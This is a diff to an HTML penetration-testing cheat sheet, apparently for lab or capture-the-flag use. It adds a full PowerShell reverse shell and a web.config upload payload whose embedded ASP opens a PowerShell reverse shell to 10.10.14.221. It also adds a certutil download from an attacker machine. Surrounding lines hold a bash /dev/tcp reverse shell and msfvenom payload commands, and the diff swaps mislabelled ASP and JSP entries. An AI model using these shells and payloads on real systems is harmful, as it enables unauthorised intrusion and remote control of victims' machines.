@@ -206,6 +206,41 @@ tcpdump -i tap0 host [IP_ADDRESS] tcp port 80 and not arp and not icmp -vv
 <p><h3>Payload Generation</h3></p>
 <p><font size="3.5" color="black">Payload list:</font></p>
 <pre style="background-color:black;color:white;">msfvenom -l</pre>
+<p><font size="3.5" color="black">Powershell</font></p>
+<pre style="background-color:black;color:white;">
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()	(reverse shell)
+(Optional: in cmd or "cmd /c powershell -c "[reverse_powershell]"")
+
+Web.config upload technique:
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+   <appSettings>
+</appSettings>
+</configuration>
+<!--
+<%
+set rs = CreateObject("WScript.Shell")
+set cmd = rs.exec("cmd /c powershell -c "$client = New-Object System.Net.Sockets.TCPClient("10.10.14.221",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+</pre>
 <p><font size="3.5" color="black">Bash</font></p>
 <pre style="background-color:black;color:white;">
 bash -i >& /dev/tcp/[ATTACKER's_IP_ADDRESS]/[ATTACKER's_PORT] 0>&1	(reverse shell)
@@ -229,7 +264,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATT
 </pre>
 <p><font size="3.5" color="black">ASP</font></p>
 <pre style="background-color:black;color:white;">
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.jsp	(reverse shell using msfvenom)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f asp > shell.asp	(reverse shell using msfvenom)
 </pre>
 <p><font size="3.5" color="black">WAR</font></p>
 <pre style="background-color:black;color:white;">
@@ -237,7 +272,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTA
 </pre>
 <p><font size="3.5" color="black">JSP</font></p>
 <pre style="background-color:black;color:white;">
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f asp > shell.asp	(reverse shell using msfvenom)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.jsp	(reverse shell using msfvenom)
 </pre>
 <p><font size="3.5" color="black">Ruby</font></p>
 <pre style="background-color:black;color:white;">
@@ -305,11 +340,17 @@ os.execute('/bin/sh')
 !sh
 </pre>
 <hr>
+<p><h3>File Transfer</h3></p>
+<p><font size="3.5" color="black">Linux --> Windows:</font></p>
+<pre style="background-color:black;color:white;">
+certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method</font></p>
+</pre>
+<p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
+<hr>
 <p><h3>Privilege Escalation</h3></p>
 <p><font size="3.5" color="black">Windows:</font></p>
 <p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
 <p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
-<p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
 <pre style="background-color:black;color:white;">
 accesschk.exe /accepteula (first thing to do in CLI access)
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
